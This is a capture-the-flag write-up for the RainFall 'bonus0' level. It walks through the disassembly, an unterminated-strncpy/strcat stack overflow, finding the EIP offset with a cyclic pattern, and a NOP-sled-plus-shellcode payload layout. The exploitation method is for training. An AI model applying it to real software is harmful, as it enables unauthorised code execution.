# Ok so we have a bonus0 

bonus0@RainFall:~$ ./bonus0 
 - 
a
 - 
b
a b

# The program is taking 2 user input and then printing it, ok let's see the code

080484b4 <p>:
 80484b4:	55                   	push   %ebp
 80484b5:	89 e5                	mov    %esp,%ebp
 80484b7:	81 ec 18 10 00 00    	sub    $0x1018,%esp
 80484bd:	8b 45 0c             	mov    0xc(%ebp),%eax
 80484c0:	89 04 24             	mov    %eax,(%esp)
 80484c3:	e8 e8 fe ff ff       	call   80483b0 <puts@plt>
 80484c8:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
 80484cf:	00 
 80484d0:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 80484d6:	89 44 24 04          	mov    %eax,0x4(%esp)
 80484da:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 80484e1:	e8 9a fe ff ff       	call   8048380 <read@plt>
 80484e6:	c7 44 24 04 0a 00 00 	movl   $0xa,0x4(%esp)
 80484ed:	00 
 80484ee:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 80484f4:	89 04 24             	mov    %eax,(%esp)
 80484f7:	e8 d4 fe ff ff       	call   80483d0 <strchr@plt>
 80484fc:	c6 00 00             	movb   $0x0,(%eax)
 80484ff:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 8048505:	c7 44 24 08 14 00 00 	movl   $0x14,0x8(%esp)
 804850c:	00 
 804850d:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048511:	8b 45 08             	mov    0x8(%ebp),%eax
 8048514:	89 04 24             	mov    %eax,(%esp)
 8048517:	e8 d4 fe ff ff       	call   80483f0 <strncpy@plt>
 804851c:	c9                   	leave  
 804851d:	c3                   	ret 
 
 # The "p" function create a buffer of size 4096, read the user input using this buffer, and use strncpy to save 20 char, this is good,
 # Since our buffer is bigger than ou n in strncy, if we put more than 20 char it will create a non null terminated string
 
 

0804851e <pp>:
 804851e:	55                   	push   %ebp
 804851f:	89 e5                	mov    %esp,%ebp
 8048521:	57                   	push   %edi
 8048522:	53                   	push   %ebx
 8048523:	83 ec 50             	sub    $0x50,%esp
 8048526:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
 804852d:	08 
 804852e:	8d 45 d0             	lea    -0x30(%ebp),%eax
 8048531:	89 04 24             	mov    %eax,(%esp)
 8048534:	e8 7b ff ff ff       	call   80484b4 <p>
 8048539:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
 8048540:	08 
 8048541:	8d 45 e4             	lea    -0x1c(%ebp),%eax
 8048544:	89 04 24             	mov    %eax,(%esp)
 8048547:	e8 68 ff ff ff       	call   80484b4 <p>
 804854c:	8d 45 d0             	lea    -0x30(%ebp),%eax
 804854f:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048553:	8b 45 08             	mov    0x8(%ebp),%eax
 8048556:	89 04 24             	mov    %eax,(%esp)
 8048559:	e8 42 fe ff ff       	call   80483a0 <strcpy@plt>
 804855e:	bb a4 86 04 08       	mov    $0x80486a4,%ebx
 8048563:	8b 45 08             	mov    0x8(%ebp),%eax
 8048566:	c7 45 c4 ff ff ff ff 	movl   $0xffffffff,-0x3c(%ebp)
 804856d:	89 c2                	mov    %eax,%edx
 804856f:	b8 00 00 00 00       	mov    $0x0,%eax
 8048574:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
 8048577:	89 d7                	mov    %edx,%edi
 8048579:	f2 ae                	repnz scas %es:(%edi),%al
 804857b:	89 c8                	mov    %ecx,%eax
 804857d:	f7 d0                	not    %eax
 804857f:	83 e8 01             	sub    $0x1,%eax
 8048582:	03 45 08             	add    0x8(%ebp),%eax
 8048585:	0f b7 13             	movzwl (%ebx),%edx
 8048588:	66 89 10             	mov    %dx,(%eax)
 804858b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
 804858e:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048592:	8b 45 08             	mov    0x8(%ebp),%eax
 8048595:	89 04 24             	mov    %eax,(%esp)
 8048598:	e8 f3 fd ff ff       	call   8048390 <strcat@plt>
 804859d:	83 c4 50             	add    $0x50,%esp
 80485a0:	5b                   	pop    %ebx
 80485a1:	5f                   	pop    %edi
 80485a2:	5d                   	pop    %ebp
 80485a3:	c3                   	ret
 
 # Call the function "p" 2 time (our 2 inputs) and then strcat them together
 # We can also see that when we call our "p" function, we pass as arguments, the address of local variable in our ebp, that are 20 bytes appart !
 # We can see that we call strcpy to put our first string in the buffer main has provided (size 42) and then add a " " char to it.
 # Then it call strcat to merge the two strings together

080485a4 <main>:
 80485a4:	55                   	push   %ebp
 80485a5:	89 e5                	mov    %esp,%ebp
 80485a7:	83 e4 f0             	and    $0xfffffff0,%esp
 80485aa:	83 ec 40             	sub    $0x40,%esp
 80485ad:	8d 44 24 16          	lea    0x16(%esp),%eax
 80485b1:	89 04 24             	mov    %eax,(%esp)
 80485b4:	e8 65 ff ff ff       	call   804851e <pp>
 80485b9:	8d 44 24 16          	lea    0x16(%esp),%eax
 80485bd:	89 04 24             	mov    %eax,(%esp)
 80485c0:	e8 eb fd ff ff       	call   80483b0 <puts@plt>
 80485c5:	b8 00 00 00 00       	mov    $0x0,%eax
 80485ca:	c9                   	leave
 
 # Create a buffer of size 42 (64-16) and send it to "pp", then it "puts" the string returned by "pp"
 
 
 # Ok so the plan is simple, if we put more than 20 char in our first input, the first string will be non null terminated !
 # We also saw that the second input is stored next to our first, meaning that in the strcpy the first string and the second one will be "smashed" together
 # So we can fill the buffer of size 42 with 41 char (1st str + 2nd str + " ")
 # Then in the strcat it will try to put the 2nd str in the buffer (witch is already full and will overflow) and we will have 20-1 bytes overflow to have fun
 # Recap : we need 1st str to be more than 20 char, 2nd str to be exactly 20 char, so 2n *d str will be writen out of strcat
 
 Finding the offset : 

Starting program: /home/user/bonus0/bonus0
 - 
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()

We found the EIP offset to be 9 ! 

We need to put our shellcode after the overflow so we can access it easy ! So we need it between +61 and 4096 ! And use the overflow to point the eip on our shellcode

We decided to arbitrary put 500 NOP instruction before our shell code so we can find it more easyly

payload : 
# first arg : [NOP * 500] + [shellcode]
# scond arg : [offset (9)] + [Address in our nop instructions (+61 to +500)] + [filler to get to 20 bytes]


